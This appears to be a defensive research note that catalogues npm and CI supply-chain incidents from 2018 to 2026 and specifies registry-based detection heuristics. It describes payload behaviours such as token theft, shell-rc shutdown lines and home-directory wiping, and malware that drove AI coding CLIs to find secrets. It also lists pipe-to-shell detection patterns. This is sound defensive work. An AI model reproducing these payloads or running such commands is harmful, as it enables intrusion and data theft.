# 03 - Threats and detection signals (npm-first)

Research date: 2026-11-23. Scope: real supply-chain incidents 2018 to late 2026, implementable
npm detection heuristics with exact data sources, the verified-vs-inference split the brief
demands, and safe seeded demo anomalies.

Verification legend used throughout section 1:

- **[V]** details confirmed in a source read during this research session (see Sources).
- **[P]** partly confirmed this session; the unconfirmed part is called out.
- **[B]** from background knowledge of well-documented incidents, **not re-verified this session**.
  Treat exact versions/dates as "check before putting on a slide".

---

## 1. Incident catalogue (2018 - late 2026)

### 1.1 Classic incidents (2018 - 2024)

| # | Incident | Date | Mechanism | Observable signal that would have caught it | Status |
|---|---|---|---|---|---|
| 1 | **event-stream / flatmap-stream** (npm) | Sept 2018 injected, found ~20 Nov 2018 | Original author handed publish rights to an unknown volunteer (`right9ctrl`), who added a new dependency `flatmap-stream@0.1.1` in `event-stream@3.3.6`; the payload was encrypted, only in the published tarball (minified file not in git), and targeted the Copay bitcoin wallet. | Maintainer change followed by a new, brand-new, zero-history dependency in a patch release; tarball content not matching the git repo. | [B] |
| 2 | **ua-parser-js** (npm) | 22 Oct 2021 | Maintainer account hijacked; versions 0.7.29, 0.8.0, 1.0.0 added a `preinstall` script that downloaded a cryptominer and a Windows credential stealer. | A long-lived package that never had lifecycle scripts gains `preinstall`; three release lines published within minutes; script does network download + exec. | [B] |
| 3 | **colors / faker** (npm) | 4-8 Jan 2022 | Legitimate maintainer sabotaged own packages (`colors@1.4.1`/`1.4.44-liberty-2` infinite loop, `faker@6.6.6` emptied). | Unusual version string/jump (`6.6.6`, `-liberty-2`), large diff with deleted source, publish after a long quiet period. Loose `^` ranges pulled it in automatically: lockfile pinning + release cooldown would have held it back. | [B] |
| 4 | **node-ipc "protestware"** | Mar 2022 (CVE-2022-23812) | Maintainer shipped 10.1.1/10.1.2 with obfuscated code that overwrote files for RU/BY geolocated IPs; 11.0.0 added dependency `peacenotwar`. | New obfuscated file (base64 strings, geo-IP API call, `fs` writes) in a patch release; new unexpected dependency in a release. | [B] |
| 5 | **PyTorch-nightly `torchtriton`** (PyPI dependency confusion) | 25-30 Dec 2022 | The name `torchtriton` existed only on PyTorch's own index; attacker registered the same name on public PyPI, and pip's `--extra-index-url` preferred the public one. Payload exfiltrated host data via DNS. | Internal-only name suddenly resolvable on the public registry; resolved source host differs from the expected private index. | [B] |
| 6 | **Alex Birsan dependency confusion** | Feb 2021 | Internal package names (leaked in package.json files) registered publicly with very high versions; resolvers picked the public, higher version. | Unscoped "internal" name that is 404 (claimable) or newly-registered on public registry; version like 99.x; no scope-to-registry mapping in `.npmrc`. | [B] |
| 7 | **3CX desktop app** | Disclosed 29 Mar 2023 | Cascading compromise: an employee installed trojanized X_TRADER (Trading Technologies), attackers reached the 3CX build environment and shipped a signed, trojanized installer (sideloaded DLL). | Valid signature did not help. Signals: build artifact not reproducible from source, bundled binary hash changed with no source change, EDR beaconing. Lesson: "signed" is not "safe". | [B] |
| 8 | **xz-utils backdoor** (CVE-2024-3094) | Disclosed 29 Mar 2024; versions 5.6.0, 5.6.1 | Multi-year social engineering made "Jia Tan" a co-maintainer; backdoor lived in the release tarball's build scripts (`build-to-host.m4`) and binary "test" files, not in reviewable git source. | New maintainer with release rights; **release tarball differs from the git tag**; opaque binary test fixtures consumed by the build; pressure accounts pushing for a maintainer change. | [B] |
| 9 | **polyfill.io** | Domain sold Feb 2024; malicious injection reported ~25 June 2024 | CDN domain and GitHub account changed owner; script served from the domain started redirecting mobile users; 100k+ sites affected. | Third-party script loaded from a mutable URL with no SRI hash; ownership change of the origin. Same class as an unpinned action or `:latest` image. | [B] |
| 10 | **Ledger connect-kit, Solana web3.js, Ultralytics, rspack** | Dec 2023 - Dec 2024 | Phished/stolen publish tokens or CI injection; malicious versions live for hours. | Publish outside the normal CI path, no matching git tag, new network endpoints in diff. | [B] |

### 1.2 The 2025 wave

| # | Incident | Date | Mechanism | Observable signal | Status |
|---|---|---|---|---|---|
| 11 | **reviewdog/action-setup** (CVE-2025-30154) | 11 Mar 2025, 18:42-20:31 UTC | `v1` tag pointed at malicious code that dumped CI secrets to logs; believed to have enabled the tj-actions compromise. Fixed by pinning to commit `3f401fe`. | Tag retargeted to a new commit; action referenced by mutable tag. | [V] CISA |
| 12 | **tj-actions/changed-files** (CVE-2025-30066) | Window 12 Mar 00:00 - 15 Mar 12:00 UTC 2025; patched in v46.0.1 | Attacker retargeted existing version tags to a malicious commit that dumped runner secrets (PATs, npm tokens, RSA keys) into build logs as double-base64. ~23k repos used the action [B]; origin traced to a stolen PAT via the reviewdog chain [B]. | `uses: tj-actions/changed-files@v45` (tag, not SHA). Tag-to-SHA mapping changed between two observations; the target commit was not on the default branch. A full-SHA pin was immune. | [V] CISA for dates/patch; [B] for scale |
| 13 | **Nx "s1ngularity"** | 26 Aug 2025, live ~4 h | `pull_request_target` workflow echoed an unsanitised PR title (shell injection) with a read/write token; attacker triggered `publish.yml` via `workflow_dispatch`, stole `NPM_TOKEN`, published `nx` 20.9.0-20.12.0 / 21.5.0-21.8.0 and several `@nx/*` packages. `postinstall` scanned for secrets, **invoked local AI CLIs (Claude, Gemini) to help find them**, and uploaded results to public GitHub repos via `gh`; appended `sudo shutdown -h 0` to shell rc files. | New `postinstall` in a package that had none; publish with no provenance/no matching git tag; script touches `~/.bashrc`, spawns `gh`/AI CLIs. Upstream: `pull_request_target` + `${{ github.event.pull_request.title }}` in `run:`. | [V] Nx postmortem (file name `telemetry.js` and repo name `s1ngularity-repository` are [B]) |
| 14 | **chalk / debug hijack ("Qix")** | 8 Sept 2025 | Maintainer phished by a fake npm "2FA reset" email (domain `npmjs.help` [B]); 18 packages (chalk 5.6.1, debug 4.4.2, ansi-styles 6.2.2, strip-ansi 7.1.1, color-convert 3.1.1, ... ~2 billion weekly downloads) got a browser-side crypto-clipper hooking `fetch`/`XMLHttpRequest`/`window.ethereum`. Live roughly 2 h [B]. | **No install script at all** - payload was in runtime code. Signals: 18 packages by one publisher within minutes; published by token/CLI with no provenance where the pipeline normally publishes; obfuscated blob in a tiny, stable utility; diff size anomaly. | [V] StepSecurity for date/versions/payload |
| 15 | **Shai-Hulud worm, wave 1** | Mid-Sept 2025 (~14-16 Sept [B]) | Self-replicating npm worm. `postinstall` ran `bundle.js`, harvested npm tokens (`.npmrc`), GitHub PATs, cloud keys (ran TruffleHog [B]); created a public repo named "Shai-Hulud" in the victim's account with the secrets; used the stolen npm token to republish every package the victim maintains. Hundreds of packages incl. `@ctrl/tinycolor`. | New `postinstall` + new large `bundle.js`; many unrelated packages gaining the identical file hash; publishes without provenance. | [V] Unit 42 (exact days [B]) |
| 16 | **Shai-Hulud 2.0 "The Second Coming"** | Late Nov 2025 (~21-24 Nov [B]; Unit 42 says "early November" first report) | Switched to **`preinstall`** (`setup_bun.js` downloads the Bun runtime, runs a >10 MB `bun_environment.js` detached). 25,000+ malicious GitHub repos across ~350 users; persistence by registering the machine as a self-hosted runner via `discussion.yaml`; **wipes the user's home directory** if it cannot steal or exfiltrate. Victims included Zapier / ENS Domains packages. | `preinstall` appears; new 10 MB JS file; install script downloads a second runtime (Bun); identical payload hash across unrelated packages. | [V] Unit 42 (package count ~800 is [B]) |
| 17 | **Slopsquatting** (threat class) | Term coined Apr 2025 (Seth Larson) | LLMs recommend packages that do not exist; attackers can pre-register those names. Study "We Have a Package for You!": 19.7% of recommended packages did not exist, 205k+ unique hallucinated names. 2023 experiment: empty `huggingface-cli` on PyPI got 30k+ downloads in 3 months. Wikipedia reports **no confirmed in-the-wild attack as of July 2026**. | Dependency name that is 404 on the registry, or registered very recently with near-zero downloads, appearing in an AI-authored commit. | [V] Wikipedia |

### 1.3 2026 (the year of CI-native worms)

| # | Incident | Date | Mechanism | Observable signal | Status |
|---|---|---|---|---|---|
| 18 | **Trivy / trivy-action / setup-trivy (TeamPCP)** CVE-2026-33634 | ~19 Mar 2026; precursor 27 Feb 2026 | A "PwnRequest" on 27 Feb exfiltrated the `aqua-bot` PAT. In March the attacker pushed malicious tag `v0.69.4` referencing **imposter commits** (`1885610c`, `70379aad`) that never merged to `main` but were reachable via GitHub's cross-fork object sharing; the tag triggered release CI. trivy-action / setup-trivy version tags were force-moved to credential-stealing commits (reported as 75 of 76 trivy-action tags and 7 setup-trivy tags [B]). C2 typosquat domain `scan.aquasecurtiy.org`, with an ICP-canister fallback. | A security scanner referenced by tag in CI. Tag SHA changed; tag commit not an ancestor of any branch in the canonical repo (imposter commit); typosquatted C2 domain in the diff. SHA-pinned users were unaffected. | [P] ramimac.me for Feb 27, v0.69.4, imposter commits, C2; tag counts and exact day [B] |
| 19 | **TeamPCP follow-ons: Checkmarx KICS, LiteLLM, Telnyx, CanisterWorm** | 20-27 Mar 2026 | Credentials stolen via Trivy were reused. **LiteLLM** (PyPI) 1.82.7 hid a base64 payload in `proxy_server.py`; 1.82.8 shipped `litellm_init.pth`, which Python executes at every interpreter start; live ~3 h; uncovered 26 Mar per Zscaler. C2 `checkmarx[.]zone`, exfil `models[.]litellm[.]cloud`. **Telnyx 4.87.1** hid payload in a WAV file. **KICS** / `checkmarx/ast-github-action` v2.3.35 and Docker Hub `kics` images were also trojanized. | Legit-looking patch versions with no matching git tag; a `.pth` file in a wheel; lookalike domains of security vendors; the file is listed in RECORD so hash checks pass - integrity is not intent. | [V] Zscaler for LiteLLM; [P] others (ramimac.me, Unit 42 mention; CanisterWorm details [B]) |
| 20 | **axios** | Discovered 30 Mar 2026 | Lead maintainer's npm account taken over (account email changed); `axios@1.14.1` and `0.30.4` published **manually via npm CLI, bypassing the project's GitHub Actions pipeline**. Only change: a new dependency `plain-crypto-js` (4.2.0/4.2.1) whose `postinstall` (`setup.js`) dropped a cross-platform RAT, then deleted itself and restored a clean `package.json`. C2 `sfrclak[.]com`. | New dependency never imported by the code ("phantom dependency"); dependency is days old with an install script; publish method changed from OIDC/CI to user token; provenance present on previous version and absent on this one; maintainer email changed. | [V] Zscaler |
| 21 | **@bitwarden/cli 2026.4.0** ("Shai-Hulud: The Third Coming") | 22 Apr 2026, live ~1.5 h | `preinstall` bootstrap downloads Bun 1.3.13 and runs a ~10 MB `bw1.js`; worm injects `setup.mjs` into packages the victim can publish. Exfil to `audit.checkmarx[.]cx`. | Same shape as wave 2: `preinstall` + Bun download + multi-MB JS. | [V] Unit 42 |
| 22 | **"Mini Shai-Hulud" - SAP CAP** | 29 Apr 2026 | `@cap-js/sqlite@2.2.2`, `@cap-js/postgres@2.2.2`, `@cap-js/db-service@2.10.1`, `mbt@1.2.48`: `"preinstall": "node setup.mjs"` downloads Bun, runs 11.7 MB `execution.js`; also plants `.vscode/setup.mjs` and `.claude/execution.js` in victim repos. | Literal string `"preinstall": "node setup.mjs"`; new files under `.vscode/` / `.claude/` in a repo diff. | [V] Unit 42 |
| 23 | **Mini Shai-Hulud - TanStack wave** | 11 May 2026 | No stolen credential: fork "pwn request" + Actions cache poisoning + OIDC token pulled from runner memory. 84 malicious artifacts over 42 `@tanstack/*` packages in 6 minutes; 373 versions / 169 packages by end of day (also `@uipath/*`, `@mistralai/mistralai`, `intercom-client@7.0.4`...). Payload delivered through an injected **`optionalDependencies` entry pointing at an orphaned git commit**. Revoking the token triggers `rm -rf ~/`. **First worm to publish with valid SLSA Build L3 provenance.** | `optionalDependencies` with a `github:`/git URL to a commit not on any branch; dozens of packages from one org published within minutes; provenance valid but `gitCommit` in the attestation is not reachable from the default branch. | [V] Unit 42 |
| 24 | **Mini Shai-Hulud - @antv wave** | 19 May 2026 | Maintainer account `atool` compromised; 639 malicious versions over 323 packages in ~1 hour (`@antv/g2`, `echarts-for-react`, `timeago.js`...). `preinstall: bun run index.js`; **version numbers inflated** (e.g. 2.2.0 to 2.4.0) so `^` ranges pick them up. | Version jump skipping minors; release burst; `preinstall`. | [V] Unit 42 |
| 25 | **Red Hat `@redhat-cloud-services/*` ("Miasma")** | 1 June 2026 | Compromised employee GitHub account pushed orphan commits that bypassed review; workflows requested OIDC tokens, so 32+ packages carried **valid provenance**. `index.js` grew ~200 KB to 4.29 MB (25x). | File-size anomaly between consecutive versions; provenance commit not on a protected branch. | [V] Unit 42 |
| 26 | **AsyncAPI (Miasma variant)** | 14 July 2026 | Malicious commits to unprotected `next`/`schema` branches leaked `NPM_TOKEN`; `@asyncapi/generator@3.3.1`, `@asyncapi/specs@6.11.2` etc. Loader runs **on install or on import**, fetches stage 2 from IPFS, persists via systemd user unit / Run key. An AI coding assistant loading the workspace triggered it without a manual `npm install`. | Import-time payload (no install script needed); IPFS / Nostr / smart-contract C2 strings; release from a non-default branch. | [V] Unit 42 |
| 27 | **keyv / cacheable ecosystem** | 4 Aug 2026 (cutoff 09:30 UTC) | A commit to `main` added a `preinstall` hook and two payload files; the project's **own OIDC trusted-publishing pipeline** published `keyv@6.0.0`, `flat-cache@6.1.24`, `file-entry-cache@11.1.6`, `cacheable-request@13.0.20`, `cache-manager@7.2.10`... (~515M weekly downloads) with valid signatures and SLSA provenance. Spread to 384 packages / 1,136 versions via stolen CI tokens (those later ones lacked provenance). `"preinstall": "node setup.mjs"` downloads Bun 1.3.13 and runs 727 KB `Math_Symbol.js` / `math_init.js`. | `preinstall` newly present; `bun-dl-*` temp dirs; `setup.mjs` SHA-256 on IOC lists; **provenance was valid** - only the script diff and release cooldown would have saved you. | [V] Endor Labs |
| 28 | **`@dforge-core/dforge-mcp@0.2.21`** | 9 Sept 2026 (reported 22 Sept) | Maintainer account used for ~105 min; attacker rewired the release workflow to publish on push to `main`; malicious version was `latest` for ~35 min with **valid npm provenance** (the Sigstore attestation simply records the attacker's commit). One-line loader at line ~3,320 of a 99 KB file. | Workflow file changed in the same commit range as the release; single very long line in a large file; release cooldown. | [V] cybersecuritynews (secondary source citing CloudSEK) |
| 29 | Other 2026 items seen but **not verified in detail**: `openapi-react-query-codegen` (Mini Shai-Hulud), a "binding.gyp" campaign (implicit `node-gyp rebuild` used as an install hook with no `scripts` entry), "Megalodon" malicious-workflow campaign, a reported GitHub internal-repo exposure linked to TeamPCP, Microsoft DurableTask. | 2026 | See search results in Sources. | Treat as leads only. | **UNVERIFIED** |

### 1.4 What the catalogue tells a detector designer

1. **Install hooks are still the number-one signal** (ua-parser-js, Nx, Shai-Hulud, axios, keyv). From late 2025 the worm family moved from `postinstall` to `preinstall` and downloads Bun to run a multi-MB payload.
2. **But not sufficient**: chalk/debug, LiteLLM 1.82.7, AsyncAPI and xz executed at import/run/build time with no lifecycle script. Diff-size, obfuscation and new-network-endpoint checks are needed too.
3. **Provenance presence is no longer a safety signal** (TanStack, Red Hat, keyv, dforge all had valid SLSA provenance in 2026). The useful checks are *provenance regression* (had it, lost it), *publisher-type change* (OIDC to token), and *attested commit not on the default branch*.
4. **Mutable references are the CI equivalent** (tj-actions, reviewdog, Trivy, polyfill.io, `:latest`). A full SHA/digest pin was a complete defence every time.
5. **A new dependency inside a patch release** is a recurring tell (event-stream, node-ipc, axios, TanStack optionalDependencies).
6. **Release cooldown works**: almost every malicious version above was removed in under 24 h (Nx ~4 h, LiteLLM ~3 h, Bitwarden ~1.5 h, dforge 35 min). "Do not adopt versions younger than N days" is the single cheapest control.

---

## 2. Detection heuristics for npm, with exact data sources

### 2.0 Data source cheat-sheet

| Source | Exact endpoint / field | Notes |
|---|---|---|
| `package-lock.json` (v2/v3) | `packages["node_modules/<name>"]` with `version`, `resolved`, `integrity`, `hasInstallScript`, `dev`, `optional`, `link`, `inBundle`, `name` (only when aliased) | v1 uses `dependencies{}` with `version`/`resolved`/`integrity`; the kit's goof target may carry both sections. |
| npm packument (full) | `GET https://registry.npmjs.org/<name>` (scoped: `@scope%2Fname`) | `time{created,modified,<ver>}`, `maintainers[]`, `dist-tags`, `versions[v].scripts`, `versions[v].dependencies/optionalDependencies`, `versions[v]._npmUser{name,email,trustedPublisher?}`, `versions[v].gitHead`, `versions[v].repository`, `versions[v].dist{tarball,shasum,integrity,fileCount,unpackedSize,signatures[],attestations{url,provenance{predicateType}}}` |
| npm packument (abbreviated) | same URL with `Accept: application/vnd.npm.install-v1+json` | Smaller; includes `hasInstallScript` per version. |
| npm provenance | `GET https://registry.npmjs.org/-/npm/v1/attestations/<name>@<version>` | Returns Sigstore bundles: SLSA provenance (`https://slsa.dev/provenance/v1`) and npm publish attestation. 404 = none. |
| npm signing keys | `GET https://registry.npmjs.org/-/npm/v1/keys`; CLI `npm audit signatures` | Verifies `dist.signatures` (ECDSA registry signature) and attestations for installed tree. |
| Downloads | `GET https://api.npmjs.org/downloads/point/last-week/<name>`; bulk `.../last-week/a,b,c` (max 128, unscoped only) | Popularity gap for typosquat and "new/unknown package" checks. |
| deps.dev | `GET https://api.deps.dev/v3/systems/npm/packages/<name>/versions/<ver>` (`publishedAt`, `advisoryKeys`, `slsaProvenances`, `relatedProjects`, `links`); `.../versions/<ver>:dependencies`; `GET /v3/projects/github.com%2F<owner>%2F<repo>` (includes Scorecard) | Second, independent witness for publish time and provenance. |
| OpenSSF Scorecard | `GET https://api.securityscorecards.dev/projects/github.com/<owner>/<repo>` | Checks: `Pinned-Dependencies`, `Dangerous-Workflow`, `Token-Permissions`, `Maintained`, `Code-Review`, `Branch-Protection`, `Signed-Releases`. |
| OSV / malicious-packages | `POST https://api.osv.dev/v1/query` `{"package":{"ecosystem":"npm","name":N},"version":V}`; batch `/v1/querybatch`; `GET /v1/vulns/MAL-YYYY-NNNN` | `MAL-` ids originate from `github.com/ossf/malicious-packages` (`osv/malicious/npm/<name>/MAL-*.json`). Can be cloned for offline use. OSV also has a `GitHub Actions` ecosystem. |
| Docker | `docker buildx imagetools inspect <ref>`; `crane digest <ref>`; registry `HEAD /v2/<repo>/manifests/<tag>` to read `Docker-Content-Digest`; `cosign verify <ref>@sha256:...`; `cosign tree <ref>` | Digest = identity; tag = pointer. |
| GitHub Actions | `GET https://api.github.com/repos/<o>/<r>/git/ref/tags/<tag>` (dereference annotated tags via `/git/tags/<sha>`); `GET /repos/<o>/<r>/commits/<sha>/branches-where-head`; `GET /repos/<o>/<r>/compare/<default>...<sha>` | Unauthenticated limit is 60 req/h: cache results, or use a throwaway read-only token kept out of the repo. |

All of these are read-only GETs against public metadata and are in scope for the hackathon rules.

### 2.1 Heuristics by risk type

Every heuristic has an ID (used again in section 3).

#### H1 - Typosquat / look-alike name

- **Inputs**: every package name in the lockfile (direct deps weighted higher), a vendored popular-name list, downloads API.
- **Popular list source**: there is no official "top N" npm endpoint. Vendor a snapshot into the repo (reproducible, offline): the `npm-high-impact` package (names with high downloads/dependents) or the ecosyste.ms packages API sorted by downloads; record the snapshot date and SHA-256 of the list file in the report. Aim for the top 5,000-10,000 names.
- **Algorithm** (run candidate `c` against each popular name `p`, skip if `c` is itself in the list):
  1. **Normalise**: lowercase, strip scope for the first pass, map `_ .` to `-`. If `normalise(c)` with all `-` removed equals `p` with all `-` removed, flag (delimiter squat).
  2. **Damerau-Levenshtein (OSA)**: flag when `d == 1` and `len(p) >= 4`, or `d == 2` and `len(p) >= 8`. Never test names shorter than 4 characters. Transposition (`lodahs`/`lodash`) counts as 1.
  3. **Keyboard adjacency**: weighted edit distance where substituting QWERTY-adjacent keys costs 0.5; flag when weighted `d <= 1.0` (catches `expresa`, `reacr`). Use only to raise confidence on a D-L hit of 2, not as a standalone trigger.
  4. **Homoglyph / visual**: canonicalise `0->o`, `1->l`, `i->l`, `rn->m`, `vv->w`, then compare for equality.
  5. **Combosquat**: tokenise on `-`; if removing one affix token from `{js, node, nodejs, cli, lib, utils, util, api, sdk, core, dev, new, v2, official, ts, plus, pro}` leaves an exact popular name and the popular package's maintainers do not overlap with the candidate's, flag (`lodash-utils`, `axios-js`).
  6. **Scope confusion**: (a) `@scope/name` vs unscoped `scope-name` or `name` where the other one is the popular one (`@types/node` vs `types-node`); (b) D-L distance 1 between the candidate's scope and a top scope (`@angullar/core`); (c) same bare name under an unexpected scope.
- **False-positive controls** (each is a verified lookup, not a guess):
  - candidate is in the popular list -> suppress (`preact`/`react`, `koa`/`boa`).
  - **maintainer overlap** between `packument(c).maintainers` and `packument(p).maintainers`, or same `repository` org -> suppress (`lodash-es`, `babel-core`).
  - **popularity gap**: require `downloads(p) >= 100k/week` and `downloads(c) < 1%` of `downloads(p)`; otherwise downgrade to "info".
  - **age**: `time.created` older than 2 years with steady downloads -> downgrade.
  - project allowlist file (`policy/typosquat-allow.yaml`) with justification.
  - If the candidate does not come from the registry at all (`file:`/git `resolved`), skip registry-based suppressions and **raise** severity: a look-alike name from a non-registry source is the kit's `lodahs` case.
- **Scoring**: name-similarity hit = finding; + install script = high; + young/low-download or non-registry source = critical; + OSV `MAL-` hit = confirmed malicious.

#### H2 - Unexpected dependency

- **Lockfile diff** between two git refs (`git show <base>:package-lock.json`): set difference of `packages` keys. Classify each added package as *explained* (a `package.json` change in the same commit adds it or adds its parent) or *unexplained* (lockfile changed, manifest did not).
- **Phantom dependency** (axios pattern): declared in `package.json` but no `require(`/`import` of it anywhere in the source (ripgrep or `depcheck`); or, for a transitive package, parent version's packument shows the dependency appeared in a patch release: compare `versions[prev].dependencies` with `versions[cur].dependencies` (+ `optionalDependencies`).
- **Aggravators**: added package `time.created` < 30 days; weekly downloads < 1,000; has install script; resolved from non-registry source; dependency spec is a git/URL spec inside `optionalDependencies` (TanStack pattern).
- **Extraneous / unreachable**: lock entries not reachable from root by walking `dependencies` are either stale or injected.

#### H3 - Suspicious update (version-to-version diff)

For each package whose version changed between two lockfile states, fetch both tarballs (`dist.tarball`), verify each against `dist.integrity`, unpack to a temp dir (never run), and compute:

| Check | Threshold |
|---|---|
| lifecycle scripts added or changed (`preinstall`, `install`, `postinstall`, `prepare`) | any change |
| `binding.gyp` added at package root (implicit `node-gyp rebuild` on install) | any |
| new entries in `dependencies` / `optionalDependencies` in a patch or minor bump | any; high if the new dep is < 30 days old |
| `dist.unpackedSize` growth | > 3x or > +500 KB in a patch release (Red Hat case was 25x) |
| new file > 1 MB, or single line > 5,000 chars, or Shannon entropy > 5.5 bits/char in a new `.js` file | any |
| new files named like known droppers: `setup.mjs`, `setup_bun.js`, `bun_environment.js`, `bundle.js`, `router_init.js`, `execution.js`, `*.pth` | any |
| new network / process / env primitives vs previous version (see install-script table, section 2.2) | any |
| semver anomaly: skipped minors, version lower than previous `latest`, pre-release tag set as `latest` | any |
| `gitHead` missing where the previous version had one, or `repository` URL changed | any |
| version age: `now - time[version]` < 7 days (configurable cooldown) | policy |

#### H4 - Unsafe install script

- **Detect presence** from three independent places and report disagreement: lockfile `hasInstallScript`; abbreviated packument `hasInstallScript`; and the truth, `scripts.{preinstall,install,postinstall}` in the tarball's own `package.json` (plus root `binding.gyp`). A lockfile that says `false`/omits the flag while the tarball has a script is itself an integrity finding.
- **Classify the script** statically using the red-flag table in section 2.2. Resolve one level of indirection: `node scripts/setup.js` means "read and score `scripts/setup.js`".
- **False-positive control**: allowlist of known native-build packages (`esbuild`, `sharp`, `bcrypt`, `node-sass`, `puppeteer`, `core-js`'s banner, `husky`); a script that only calls `node-gyp rebuild`, `prebuild-install`, `node install.js` with a download from the package's own GitHub releases is "expected-native", severity info.
- **Recommended control to cite**: `npm ci --ignore-scripts` plus an explicit allowlist (pnpm 10 does this by default [B]).

#### H5 - Untrusted container image

Parse every `FROM` in Dockerfiles and every `image:` in compose/k8s files:

| Signal | Rule |
|---|---|
| mutable tag | no tag, `:latest`, or a floating tag (`node:18`, `node:lts`) without `@sha256:` |
| no digest pin | regex `@sha256:[0-9a-f]{64}` absent |
| untrusted origin | registry host not in policy allowlist; Docker Hub namespace is not `library/` (official), not a Verified Publisher, not the org's own |
| namespace typosquat | run H1 on namespace and repo name against a short list of official images |
| tag drift | digest observed now (`crane digest`) differs from the digest recorded in the last Guardian run for the same tag |
| no signature / provenance | `cosign verify` fails or `docker buildx imagetools inspect --format '{{json .Provenance}}'` is empty |
| unsafe build steps | `RUN curl ... | sh`, `ADD http(s)://`, `npm install` (not `npm ci`), no `USER`, secrets in `ARG`/`ENV` |
| EOL base | base image major is end-of-life (e.g. goof's `node:18` reached EOL in 2025 [B]) |

#### H6 - Modified lockfile / integrity change

For each lock entry:

1. `resolved` host is not `registry.npmjs.org` (or the configured registry from `.npmrc`) -> finding. Sub-types: `http://`, `git+...`, `github:`, `file:`, IP literal, unknown host.
2. Name/version consistency: the path of `resolved` must be `/<name>/-/<basename>-<version>.tgz` matching the lock key and `version` (catches a swapped tarball under a trusted name; mind aliases via the entry's `name` field).
3. `integrity` missing, or only `sha1-` when the registry offers `sha512-`.
4. **Registry cross-check**: `integrity` must equal `packument.versions[version].dist.integrity`. Mismatch = critical (this is the kit's optional `--with-integrity-tamper` case).
5. Tarball recomputation: `sha512(base64)` of the downloaded tarball equals both of the above.
6. Diff-level: lockfile changed in a commit with no `package.json` change; `integrity` changed while `version` did not (should never happen for a registry package); `lockfileVersion` downgraded; `hasInstallScript` flag removed.
7. `package.json` / lock drift: `npm ci --ignore-scripts --dry-run` (or `npm ls --package-lock-only`) fails.

#### H7 - Unpinned or unsafe CI component

Parse `.github/workflows/*.yml` (YAML parse, not regex only):

| Signal | Rule |
|---|---|
| unpinned action | `uses: owner/repo@ref` where `ref` is not 40 hex chars. First-party `actions/*` = low, third-party = high. |
| known-compromised action | `owner/repo` on a vendored list (tj-actions/changed-files, reviewdog/action-setup, aquasecurity/trivy-action, aquasecurity/setup-trivy, checkmarx/ast-github-action) and/or OSV query with ecosystem `GitHub Actions` |
| tag drift / imposter commit | resolve tag to SHA via the GitHub API and store it; alert if it changes; check the pinned SHA is reachable from a branch of the canonical repo (`branches-where-head` / compare API), otherwise "imposter commit" (Trivy 2026 pattern) |
| excessive token | `permissions: write-all`, or no `permissions:` block at all |
| pwn-request | `on: pull_request_target` (or `workflow_run`) combined with `actions/checkout` of `github.event.pull_request.head.*` |
| script injection | `${{ github.event.* }}` (title, body, head.ref, comment.body) interpolated inside a `run:` block (Nx root cause) |
| pipe-to-shell | `curl|wget ... | (ba)sh`, `iex (iwr ...)` |
| long-lived publish secret | `NPM_TOKEN` in a workflow instead of OIDC trusted publishing (`id-token: write`) |
| unpinned tools in CI | `npx <pkg>` without version, `npm install` instead of `npm ci`, `docker://image:latest`, `container: image:latest` |

Reuse existing linters where possible (`zizmor`, `actionlint`, Scorecard `Pinned-Dependencies` / `Dangerous-Workflow` / `Token-Permissions`) and record their output as evidence.

#### H8 - Dependency confusion

1. Collect "internal-looking" names: scopes mapped to a private registry in `.npmrc` (`@scope:registry=`), names matching org patterns from policy (`@acme/*`, `*-internal`, `acme-*`), and anything whose lock `resolved` is non-public.
2. For each, `GET https://registry.npmjs.org/<name>`:
   - **404 on an unscoped name** = claimable by anyone (high). **404 for a scope** whose org is not registered on npm = claimable scope.
   - **200** while the lockfile resolves it elsewhere = name collision; compare `dist-tags.latest` on public vs the locked version. Public version much higher (`99.x`, `9999.x`) or `time.created` recent = active confusion attempt (critical).
3. Config check: a scope used in `package.json` with **no** `@scope:registry` line in `.npmrc`; an unscoped internal name at all (unscoped names cannot be registry-pinned).
4. Slopsquatting shares the same check: a declared dependency that is 404, or exists but `time.created` < 90 days and downloads < 100/week, in an AI-authored change.

#### H9 - Maintainer / publisher change

- Packument `maintainers[]` is current state only, so **snapshot it** per package on every Guardian run (evidence store) and diff over time. Without history, use per-version `versions[v]._npmUser.name`: flag when the publisher of the locked version is not among the publishers of the previous N (say 5) versions.
- **Publisher-type change** (axios, chalk): previous versions have `_npmUser.trustedPublisher` (OIDC/CI publish) or attestations; the new one is published by a human token with neither.
- Aggravators: maintainer email domain changed; new maintainer account plus a release within 7 days; sole-maintainer package; deps.dev/Scorecard `Maintained` low.

#### H10 - Unusual release activity

From `packument.time`:

- **Version age** below cooldown (default 7 days; block < 24 h) for the locked version.
- **Burst**: >= 3 versions within 60 minutes, or simultaneous publishes on multiple major lines (ua-parser-js: 0.7.x, 0.8.x, 1.0.x together).
- **Dormancy break**: gap since previous release > 12 months, then a release that changes scripts or dependencies.
- **Off-pattern version**: skipped minors (antv 2.2.0 to 2.4.0), odd strings (`6.6.6`, `-liberty-2`), `dist-tags.latest` moved backwards.
- **No source counterpart**: `gitHead` absent, or no tag `v<version>` in the linked repository (GitHub API `git/ref/tags/v<version>` 404).
- **Unpublish traces**: version in the lockfile no longer present in `versions` but still listed in `time` (pulled by npm security) = treat as compromised.
- **Org-wide burst** (Shai-Hulud tell): many packages sharing a maintainer published within the same hour.

#### H11 - Provenance gap

1. `GET /-/npm/v1/attestations/<name>@<version>`: 404 = no provenance (info for most packages; today a minority publish with it).
2. **Regression** (the high-value check): an earlier version of the same package had `dist.attestations` and the locked/new one does not.
3. If present, **verify, do not trust**: Sigstore bundle verifies (`npm audit signatures`, or sigstore-js / `cosign verify-blob-attestation`); in the decoded in-toto statement `subject[0].digest.sha512` equals the hex of `dist.integrity`; `predicate.buildDefinition.externalParameters.workflow.repository` equals the packument `repository`; and `resolvedDependencies[0].digest.gitCommit` is reachable from the default branch or a release tag.
4. **Provenance drift**: workflow `path` or `ref` in the attestation differs from the previous version's attestation (dforge 2026: release workflow rewired).
5. Registry signature: `dist.signatures[].keyid` matches a key from `/-/npm/v1/keys` and verifies over `<name>@<version>:<integrity>`.
6. Containers: `cosign verify` with expected identity/issuer; SLSA provenance attestation present.
7. Always print the caveat: valid provenance proves *where and how* something was built, not that the source was benign (TanStack, Red Hat, keyv, dforge).

#### H0 - Known-malicious lookup (do this first, it is the cheapest verified signal)

`POST https://api.osv.dev/v1/querybatch` with every `name@version` from the SBOM. Any id starting with `MAL-` is a confirmed-malicious record from the OpenSSF malicious-packages repo; `GHSA-`/`CVE-` are vulnerabilities. Also query bare names without a version to catch packages that are malicious in all versions.

### 2.2 Install-script red-flag table

